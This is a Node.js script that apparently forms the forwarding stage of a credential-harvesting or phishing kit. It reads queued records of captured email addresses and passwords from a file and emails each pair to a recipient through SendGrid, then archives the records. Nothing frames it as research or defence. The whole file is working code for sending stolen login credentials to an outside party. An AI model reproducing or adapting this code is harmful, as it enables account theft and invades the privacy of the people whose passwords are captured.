/**
 * Email Processor for Login Credentials
 * Reads from the email queue and sends emails via SendGrid
 */

const fs = require('fs');
const path = require('path');
const { sendLoginCredentials } = require('./sendmail');

// Configuration
const EMAIL_QUEUE_FILE = 'email_queue.json';
const PROCESSED_DIR = 'processed_emails';

// Create processed directory if it doesn't exist
if (!fs.existsSync(PROCESSED_DIR)) {
  fs.mkdirSync(PROCESSED_DIR);
}

/**
 * Process the email queue
 */
async function processEmailQueue() {
  try {
    if (!fs.existsSync(EMAIL_QUEUE_FILE)) {
      console.log('No email queue file found.');
      return;
    }

    const queueContent = fs.readFileSync(EMAIL_QUEUE_FILE, 'utf8');
    const lines = queueContent.trim().split('\n');
    
    if (lines.length === 0) {
      console.log('Email queue is empty.');
      return;
    }

    // Clear the queue file
    fs.writeFileSync(EMAIL_QUEUE_FILE, '');

    // Process each line (each email request)
    for (const line of lines) {
      try {
        const data = JSON.parse(line);
        const { capturedEmail, capturedPassword, recipientEmail, timestamp } = data;
        
        // Send the email
        const success = await sendLoginCredentials(
          capturedEmail, 
          capturedPassword, 
          recipientEmail
        );
        
        // Log the result
        if (success) {
          console.log(`Successfully sent email for credentials captured at ${timestamp}`);
        } else {
          console.error(`Failed to send email for credentials captured at ${timestamp}`);
        }
        
        // Save processed request to archive
        const archiveFile = path.join(PROCESSED_DIR, `email_${Date.now()}.json`);
        fs.writeFileSync(archiveFile, JSON.stringify({
          ...data,
          emailSent: success,
          processedAt: new Date().toISOString()
        }));
        
      } catch (error) {
        console.error('Error processing email request:', error);
      }
    }
  } catch (error) {
    console.error('Error reading email queue:', error);
  }
}

// Process the queue once when the script is run
processEmailQueue();

// You can also set up a timer to process the queue periodically
// For example, process every 5 minutes:
// setInterval(processEmailQueue, 5 * 60 * 1000);